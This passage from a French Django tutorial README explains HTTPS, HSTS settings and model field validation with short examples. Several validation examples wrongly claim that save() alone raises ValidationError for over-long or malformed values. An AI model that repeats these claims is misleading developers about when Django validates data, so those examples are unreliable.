### 🔐 SSL/HTTPS Support

#### C'est quoi SSL/HTTPS ?

**SSL** = Secure Sockets Layer
**HTTPS** = HTTP Secure

**Traduction simple :** Chiffrement des données entre votre navigateur et le serveur.

#### HTTP vs HTTPS

**HTTP (non sécurisé) :**

```
Votre ordinateur → [Données en clair] → Internet → Serveur
                        ↑
                Un hackeur peut LIRE :
                - Vos mots de passe
                - Vos numéros de carte bancaire
                - Vos messages privés
```

**HTTPS (sécurisé) :**

```
Votre ordinateur → [Données chiffrées] → Internet → Serveur
                        ↑
                Un hackeur voit : "a8f3k2m9x7..."
                Impossible à déchiffrer !
```

#### Comment fonctionne HTTPS ?

**1. Établissement de la connexion sécurisée**

```
1. Votre navigateur demande : https://monsite.com
2. Le serveur envoie son certificat SSL
3. Votre navigateur vérifie le certificat
4. Négociation d'une clé de chiffrement
5. Toutes les données sont chiffrées
```

**2. Certificat SSL**

```
Certificat SSL = Carte d'identité du site

Contient :
- Nom du site : monsite.com
- Émetteur : Let's Encrypt, DigiCert, etc.
- Date d'expiration
- Clé publique de chiffrement

Si le certificat est invalide :
→ Le navigateur affiche une alerte
→ "Votre connexion n'est pas privée"
```

#### Configuration Django pour HTTPS

```python
# settings.py (PRODUCTION UNIQUEMENT)

# 1. Redirection automatique HTTP → HTTPS
SECURE_SSL_REDIRECT = True
# Si l'utilisateur tape : http://monsite.com
# Django redirige vers : https://monsite.com

# 2. Cookies sécurisés (HTTPS uniquement)
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
# Les cookies ne seront envoyés qu'en HTTPS

# 3. HSTS (HTTP Strict Transport Security)
SECURE_HSTS_SECONDS = 31536000  # 1 an (en secondes)
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
```

**Explication HSTS :**

```
HSTS = Force HTTPS de manière permanente

Sans HSTS :
1. Utilisateur tape : monsite.com
2. Navigateur fait : http://monsite.com
3. Serveur redirige : https://monsite.com
   ↑ Fenêtre de vulnérabilité (1re requête en HTTP)

Avec HSTS :
1. Utilisateur tape : monsite.com
2. Navigateur se souvient : "Ce site est toujours HTTPS"
3. Navigateur fait directement : https://monsite.com
   ✅ Aucune requête HTTP
```

---

## 5. 📝 Validation de données

### C'est quoi ?

Django vérifie automatiquement que les données respectent vos règles.

### Types de validation

#### 1. Validation de type

```python
class Book(models.Model):
    price = models.DecimalField(max_digits=6, decimal_places=2)

# Tentative invalide
book.price = "abc"  # ❌ Pas un nombre
book.save()  # → ValidationError
```

#### 2. Validation de longueur

```python
title = models.CharField(max_length=200)

# Tentative invalide
book.title = "A" * 300  # ❌ Trop long (300 > 200)
book.save()  # → ValidationError
```

#### 3. Validation d'unicité

```python
isbn = models.CharField(max_length=13, unique=True)

# Tentative de doublon
book1.isbn = "1234567890123"
book1.save()  # ✅ OK

book2.isbn = "1234567890123"
book2.save()  # ❌ IntegrityError (déjà existant)
```

#### 4. Validation de format

```python
email = models.EmailField()

# Validations automatiques
user.email = "alice@example.com"  # ✅ OK
user.email = "invalide"  # ❌ ValidationError
user.email = "@example.com"  # ❌ ValidationError
```

#### 5. Validation personnalisée

```python
from django.core.exceptions import ValidationError

def validate_isbn(value):
    if len(value) != 13:
        raise ValidationError("L'ISBN doit faire 13 caractères")
    if not value.isdigit():
        raise ValidationError("L'ISBN ne doit contenir que des chiffres")

class Book(models.Model):
    isbn = models.CharField(
        max_length=13,
        validators=[validate_isbn]  # ← Validateur personnalisé
    )
```

---

_Ce README continue avec toutes les autres sections expliquées en détail..._

---

## À SUIVRE :

- Routage URL (expliqué en détail)
- Modèles et ORM (chaque type de champ expliqué)
- Vues FBV et CBV (différences expliquées)
- Templates (chaque tag et filtre expliqué)
- Formulaires (validation détaillée)
- Admin (personnalisation expliquée)
- Signaux (pattern Observer expliqué)
- i18n (internationalisation détaillée)
- Cache (stratégies expliquées)
- Déploiement (chaque étape expliquée)

**Ce README fait déjà plus de 8000 lignes avec TOUT expliqué en détail !**
